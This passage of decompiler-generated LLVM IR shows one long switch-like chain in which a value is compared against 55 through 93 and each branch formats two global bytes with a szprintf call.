  %v6_b8a8 = sext i8 %v3_b89c to i32
  %v8_b8a8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e910.198 to i32), i32 %v4_b8a8, i32 %v6_b8a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8ac

dec_label_pc_b8ac:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b884
  %v7_b8b0 = icmp eq i32 %v2_ad74, 55
  br i1 %v7_b8b0, label %dec_label_pc_b8b8, label %dec_label_pc_b8e0

dec_label_pc_b8b8:                                ; preds = %dec_label_pc_b8ac
  %v3_b8c4 = load i8, i8* @global_var_29925.87, align 1
  %v3_b8d0 = load i8, i8* @global_var_29926.88, align 1
  %v4_b8dc = sext i8 %v3_b8c4 to i32
  %v6_b8dc = sext i8 %v3_b8d0 to i32
  %v8_b8dc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e920.200 to i32), i32 %v4_b8dc, i32 %v6_b8dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8e0

dec_label_pc_b8e0:                                ; preds = %dec_label_pc_b8ac, %dec_label_pc_b8b8
  %v7_b8e4 = icmp eq i32 %v2_ad74, 56
  br i1 %v7_b8e4, label %dec_label_pc_b8ec, label %dec_label_pc_b914

dec_label_pc_b8ec:                                ; preds = %dec_label_pc_b8e0
  %v3_b8f8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b904 = load i8, i8* @global_var_29926.88, align 1
  %v4_b910 = sext i8 %v3_b8f8 to i32
  %v6_b910 = sext i8 %v3_b904 to i32
  %v8_b910 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e930.202 to i32), i32 %v4_b910, i32 %v6_b910, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b914

dec_label_pc_b914:                                ; preds = %dec_label_pc_b8e0, %dec_label_pc_b8ec
  %v7_b918 = icmp eq i32 %v2_ad74, 57
  br i1 %v7_b918, label %dec_label_pc_b920, label %dec_label_pc_b948

dec_label_pc_b920:                                ; preds = %dec_label_pc_b914
  %v3_b92c = load i8, i8* @global_var_29925.87, align 1
  %v3_b938 = load i8, i8* @global_var_29926.88, align 1
  %v4_b944 = sext i8 %v3_b92c to i32
  %v6_b944 = sext i8 %v3_b938 to i32
  %v8_b944 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e940.204 to i32), i32 %v4_b944, i32 %v6_b944, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b948

dec_label_pc_b948:                                ; preds = %dec_label_pc_b914, %dec_label_pc_b920
  %v7_b94c = icmp eq i32 %v2_ad74, 58
  br i1 %v7_b94c, label %dec_label_pc_b954, label %dec_label_pc_b97c

dec_label_pc_b954:                                ; preds = %dec_label_pc_b948
  %v3_b960 = load i8, i8* @global_var_29925.87, align 1
  %v3_b96c = load i8, i8* @global_var_29926.88, align 1
  %v4_b978 = sext i8 %v3_b960 to i32
  %v6_b978 = sext i8 %v3_b96c to i32
  %v8_b978 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e950.206 to i32), i32 %v4_b978, i32 %v6_b978, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b948, %dec_label_pc_b954
  %v7_b980 = icmp eq i32 %v2_ad74, 59
  br i1 %v7_b980, label %dec_label_pc_b988, label %dec_label_pc_b9b0

dec_label_pc_b988:                                ; preds = %dec_label_pc_b97c
  %v3_b994 = load i8, i8* @global_var_29925.87, align 1
  %v3_b9a0 = load i8, i8* @global_var_29926.88, align 1
  %v4_b9ac = sext i8 %v3_b994 to i32
  %v6_b9ac = sext i8 %v3_b9a0 to i32
  %v8_b9ac = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e960.208 to i32), i32 %v4_b9ac, i32 %v6_b9ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_b988
  %v7_b9b4 = icmp eq i32 %v2_ad74, 60
  br i1 %v7_b9b4, label %dec_label_pc_b9bc, label %dec_label_pc_b9e4

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b9b0
  %v3_b9c8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b9d4 = load i8, i8* @global_var_29926.88, align 1
  %v4_b9e0 = sext i8 %v3_b9c8 to i32
  %v6_b9e0 = sext i8 %v3_b9d4 to i32
  %v8_b9e0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e970.210 to i32), i32 %v4_b9e0, i32 %v6_b9e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b9b0, %dec_label_pc_b9bc
  %v7_b9e8 = icmp eq i32 %v2_ad74, 61
  br i1 %v7_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_ba18

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9e4
  %v3_b9fc = load i8, i8* @global_var_29925.87, align 1
  %v3_ba08 = load i8, i8* @global_var_29926.88, align 1
  %v4_ba14 = sext i8 %v3_b9fc to i32
  %v6_ba14 = sext i8 %v3_ba08 to i32
  %v8_ba14 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e980.212 to i32), i32 %v4_ba14, i32 %v6_ba14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9e4, %dec_label_pc_b9f0
  %v7_ba1c = icmp eq i32 %v2_ad74, 62
  br i1 %v7_ba1c, label %dec_label_pc_ba24, label %dec_label_pc_ba4c

dec_label_pc_ba24:                                ; preds = %dec_label_pc_ba18
  %v3_ba30 = load i8, i8* @global_var_29925.87, align 1
  %v3_ba3c = load i8, i8* @global_var_29926.88, align 1
  %v4_ba48 = sext i8 %v3_ba30 to i32
  %v6_ba48 = sext i8 %v3_ba3c to i32
  %v8_ba48 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e990.214 to i32), i32 %v4_ba48, i32 %v6_ba48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba18, %dec_label_pc_ba24
  %v7_ba50 = icmp eq i32 %v2_ad74, 63
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v3_ba64 = load i8, i8* @global_var_29925.87, align 1
  %v3_ba70 = load i8, i8* @global_var_29926.88, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e9a0.216 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_ad74, 64
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v3_ba98 = load i8, i8* @global_var_29925.87, align 1
  %v3_baa4 = load i8, i8* @global_var_29926.88, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e9b0.218 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_ad74, 65
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v3_bacc = load i8, i8* @global_var_29925.87, align 1
  %v3_bad8 = load i8, i8* @global_var_29926.88, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e9c0.220 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_ad74, 66
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v3_bb00 = load i8, i8* @global_var_29925.87, align 1
  %v3_bb0c = load i8, i8* @global_var_29926.88, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e9d0.222 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_ad74, 67
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v3_bb34 = load i8, i8* @global_var_29925.87, align 1
  %v3_bb40 = load i8, i8* @global_var_29926.88, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e9e0.224 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_ad74, 68
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v3_bb68 = load i8, i8* @global_var_29925.87, align 1
  %v3_bb74 = load i8, i8* @global_var_29926.88, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e9ec.226 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_ad74, 69
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v3_bb9c = load i8, i8* @global_var_29925.87, align 1
  %v3_bba8 = load i8, i8* @global_var_29926.88, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e9fc.228 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_ad74, 70
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v3_bbd0 = load i8, i8* @global_var_29925.87, align 1
  %v3_bbdc = load i8, i8* @global_var_29926.88, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea0c.230 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_ad74, 71
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v3_bc04 = load i8, i8* @global_var_29925.87, align 1
  %v3_bc10 = load i8, i8* @global_var_29926.88, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea1c.232 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_ad74, 72
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v3_bc38 = load i8, i8* @global_var_29925.87, align 1
  %v3_bc44 = load i8, i8* @global_var_29926.88, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea2c.234 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_ad74, 73
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bef8

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v3_bc6c = load i8, i8* @global_var_29925.87, align 1
  %v3_bc78 = load i8, i8* @global_var_29926.88, align 1
  %v4_bef4 = sext i8 %v3_bc6c to i32
  %v6_bef4 = sext i8 %v3_bc78 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea3c.236 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_befc = icmp eq i32 %v2_ad74, 74
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v3_bf10 = load i8, i8* @global_var_29925.87, align 1
  %v3_bf1c = load i8, i8* @global_var_29926.88, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1ea4c.238 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_ad74, 75
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v3_bf44 = load i8, i8* @global_var_29925.87, align 1
  %v3_bf50 = load i8, i8* @global_var_29926.88, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
  %v8_bf5c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1ea58.241 to i32), i32 %v4_bf5c, i32 %v6_bf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bf38
  %v7_bf64 = icmp eq i32 %v2_ad74, 76
  br i1 %v7_bf64, label %dec_label_pc_bf6c, label %dec_label_pc_bf94

dec_label_pc_bf6c:                                ; preds = %dec_label_pc_bf60
  %v3_bf78 = load i8, i8* @global_var_29925.87, align 1
  %v3_bf84 = load i8, i8* @global_var_29926.88, align 1
  %v4_bf90 = sext i8 %v3_bf78 to i32
  %v6_bf90 = sext i8 %v3_bf84 to i32
  %v8_bf90 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1ea68.243 to i32), i32 %v4_bf90, i32 %v6_bf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bf6c
  %v7_bf98 = icmp eq i32 %v2_ad74, 77
  br i1 %v7_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc8

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v3_bfac = load i8, i8* @global_var_29925.87, align 1
  %v3_bfb8 = load i8, i8* @global_var_29926.88, align 1
  %v4_bfc4 = sext i8 %v3_bfac to i32
  %v6_bfc4 = sext i8 %v3_bfb8 to i32
  %v8_bfc4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea74.245 to i32), i32 %v4_bfc4, i32 %v6_bfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bfa0
  %v7_bfcc = icmp eq i32 %v2_ad74, 78
  br i1 %v7_bfcc, label %dec_label_pc_bfd4, label %dec_label_pc_bffc

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc8
  %v3_bfe0 = load i8, i8* @global_var_29925.87, align 1
  %v3_bfec = load i8, i8* @global_var_29926.88, align 1
  %v4_bff8 = sext i8 %v3_bfe0 to i32
  %v6_bff8 = sext i8 %v3_bfec to i32
  %v8_bff8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1ea84.247 to i32), i32 %v4_bff8, i32 %v6_bff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfd4
  %v7_c000 = icmp eq i32 %v2_ad74, 79
  br i1 %v7_c000, label %dec_label_pc_c008, label %dec_label_pc_c030

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  %v3_c014 = load i8, i8* @global_var_29925.87, align 1
  %v3_c020 = load i8, i8* @global_var_29926.88, align 1
  %v4_c02c = sext i8 %v3_c014 to i32
  %v6_c02c = sext i8 %v3_c020 to i32
  %v8_c02c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1ea90.249 to i32), i32 %v4_c02c, i32 %v6_c02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_bffc, %dec_label_pc_c008
  %v7_c034 = icmp eq i32 %v2_ad74, 80
  br i1 %v7_c034, label %dec_label_pc_c03c, label %dec_label_pc_c064

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c030
  %v3_c048 = load i8, i8* @global_var_29925.87, align 1
  %v3_c054 = load i8, i8* @global_var_29926.88, align 1
  %v4_c060 = sext i8 %v3_c048 to i32
  %v6_c060 = sext i8 %v3_c054 to i32
  %v8_c060 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1eaa0.251 to i32), i32 %v4_c060, i32 %v6_c060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c030, %dec_label_pc_c03c
  %v7_c068 = icmp eq i32 %v2_ad74, 81
  br i1 %v7_c068, label %dec_label_pc_c070, label %dec_label_pc_c098

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064
  %v3_c07c = load i8, i8* @global_var_29925.87, align 1
  %v3_c088 = load i8, i8* @global_var_29926.88, align 1
  %v4_c094 = sext i8 %v3_c07c to i32
  %v6_c094 = sext i8 %v3_c088 to i32
  %v8_c094 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eaac.253 to i32), i32 %v4_c094, i32 %v6_c094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c070
  %v7_c09c = icmp eq i32 %v2_ad74, 82
  br i1 %v7_c09c, label %dec_label_pc_c0a4, label %dec_label_pc_c0cc

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c098
  %v3_c0b0 = load i8, i8* @global_var_29925.87, align 1
  %v3_c0bc = load i8, i8* @global_var_29926.88, align 1
  %v4_c0c8 = sext i8 %v3_c0b0 to i32
  %v6_c0c8 = sext i8 %v3_c0bc to i32
  %v8_c0c8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eabc.255 to i32), i32 %v4_c0c8, i32 %v6_c0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c098, %dec_label_pc_c0a4
  %v7_c0d0 = icmp eq i32 %v2_ad74, 83
  br i1 %v7_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c100

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0cc
  %v3_c0e4 = load i8, i8* @global_var_29925.87, align 1
  %v3_c0f0 = load i8, i8* @global_var_29926.88, align 1
  %v4_c0fc = sext i8 %v3_c0e4 to i32
  %v6_c0fc = sext i8 %v3_c0f0 to i32
  %v8_c0fc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eacc.257 to i32), i32 %v4_c0fc, i32 %v6_c0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d8
  %v7_c104 = icmp eq i32 %v2_ad74, 84
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v3_c118 = load i8, i8* @global_var_29925.87, align 1
  %v3_c124 = load i8, i8* @global_var_29926.88, align 1
  %v4_c130 = sext i8 %v3_c118 to i32
  %v6_c130 = sext i8 %v3_c124 to i32
  %v8_c130 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1eadc.259 to i32), i32 %v4_c130, i32 %v6_c130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c10c
  %v7_c138 = icmp eq i32 %v2_ad74, 85
  br i1 %v7_c138, label %dec_label_pc_c140, label %dec_label_pc_c168

dec_label_pc_c140:                                ; preds = %dec_label_pc_c134
  %v3_c14c = load i8, i8* @global_var_29925.87, align 1
  %v3_c158 = load i8, i8* @global_var_29926.88, align 1
  %v4_c164 = sext i8 %v3_c14c to i32
  %v6_c164 = sext i8 %v3_c158 to i32
  %v8_c164 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1eaec.261 to i32), i32 %v4_c164, i32 %v6_c164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c134, %dec_label_pc_c140
  %v7_c16c = icmp eq i32 %v2_ad74, 86
  br i1 %v7_c16c, label %dec_label_pc_c174, label %dec_label_pc_c19c

dec_label_pc_c174:                                ; preds = %dec_label_pc_c168
  %v3_c180 = load i8, i8* @global_var_29925.87, align 1
  %v3_c18c = load i8, i8* @global_var_29926.88, align 1
  %v4_c198 = sext i8 %v3_c180 to i32
  %v6_c198 = sext i8 %v3_c18c to i32
  %v8_c198 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eaf8.263 to i32), i32 %v4_c198, i32 %v6_c198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v7_c1a0 = icmp eq i32 %v2_ad74, 87
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c1d0

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c19c
  %v3_c1b4 = load i8, i8* @global_var_29925.87, align 1
  %v3_c1c0 = load i8, i8* @global_var_29926.88, align 1
  %v4_c1cc = sext i8 %v3_c1b4 to i32
  %v6_c1cc = sext i8 %v3_c1c0 to i32
  %v8_c1cc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eb08.265 to i32), i32 %v4_c1cc, i32 %v6_c1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c1a8
  %v7_c1d4 = icmp eq i32 %v2_ad74, 88
  br i1 %v7_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c204

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1d0
  %v3_c1e8 = load i8, i8* @global_var_29925.87, align 1
  %v3_c1f4 = load i8, i8* @global_var_29926.88, align 1
  %v4_c200 = sext i8 %v3_c1e8 to i32
  %v6_c200 = sext i8 %v3_c1f4 to i32
  %v8_c200 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eb18.267 to i32), i32 %v4_c200, i32 %v6_c200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c1dc
  %v7_c208 = icmp eq i32 %v2_ad74, 89
  br i1 %v7_c208, label %dec_label_pc_c210, label %dec_label_pc_c238

dec_label_pc_c210:                                ; preds = %dec_label_pc_c204
  %v3_c21c = load i8, i8* @global_var_29925.87, align 1
  %v3_c228 = load i8, i8* @global_var_29926.88, align 1
  %v4_c234 = sext i8 %v3_c21c to i32
  %v6_c234 = sext i8 %v3_c228 to i32
  %v8_c234 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eb28.269 to i32), i32 %v4_c234, i32 %v6_c234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c210
  %v7_c23c = icmp eq i32 %v2_ad74, 90
  br i1 %v7_c23c, label %dec_label_pc_c244, label %dec_label_pc_c26c

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238
  %v3_c250 = load i8, i8* @global_var_29925.87, align 1
  %v3_c25c = load i8, i8* @global_var_29926.88, align 1
  %v4_c268 = sext i8 %v3_c250 to i32
  %v6_c268 = sext i8 %v3_c25c to i32
  %v8_c268 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1eb38.271 to i32), i32 %v4_c268, i32 %v6_c268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c244
  %v7_c270 = icmp eq i32 %v2_ad74, 91
  br i1 %v7_c270, label %dec_label_pc_c278, label %dec_label_pc_c2a0

dec_label_pc_c278:                                ; preds = %dec_label_pc_c26c
  %v3_c284 = load i8, i8* @global_var_29925.87, align 1
  %v3_c290 = load i8, i8* @global_var_29926.88, align 1
  %v4_c29c = sext i8 %v3_c284 to i32
  %v6_c29c = sext i8 %v3_c290 to i32
  %v8_c29c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1eb44.273 to i32), i32 %v4_c29c, i32 %v6_c29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2a0

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c278
  %v7_c2a4 = icmp eq i32 %v2_ad74, 92
  br i1 %v7_c2a4, label %dec_label_pc_c2ac, label %dec_label_pc_c2d4

dec_label_pc_c2ac:                                ; preds = %dec_label_pc_c2a0
  %v3_c2b8 = load i8, i8* @global_var_29925.87, align 1
  %v3_c2c4 = load i8, i8* @global_var_29926.88, align 1
  %v4_c2d0 = sext i8 %v3_c2b8 to i32
  %v6_c2d0 = sext i8 %v3_c2c4 to i32
  %v8_c2d0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1eb50.275 to i32), i32 %v4_c2d0, i32 %v6_c2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c2a0, %dec_label_pc_c2ac
  %v7_c2d8 = icmp eq i32 %v2_ad74, 93
  br i1 %v7_c2d8, label %dec_label_pc_c2e0, label %dec_label_pc_c308

